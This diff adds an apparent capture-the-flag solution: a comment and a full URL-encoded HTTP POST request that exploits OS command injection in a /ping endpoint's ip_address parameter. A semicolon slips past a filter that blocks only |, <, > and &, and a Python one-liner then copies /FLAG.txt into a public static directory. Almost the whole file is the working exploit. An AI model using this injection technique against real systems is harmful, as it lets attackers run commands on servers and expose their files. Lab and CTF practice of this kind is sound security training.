@@ -1,0 +1,8 @@
+# OS command injection via semicolon in ip_address param. Python used to copy /FLAG.txt to web-accessible static dir. Filter bypassed: only |, <, >, & are blocked.
+
+POST /ping HTTP/1.1
+Host: 172.17.0.1:42571
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 138
+
+ip_address=%3B+python3+-c+%22open%28%27%2Fapp%2Fstatic%2Fflag_out.txt%27%2C%27w%27%29.write%28open%28%27%2FFLAG.txt%27%29.read%28%29%29%22
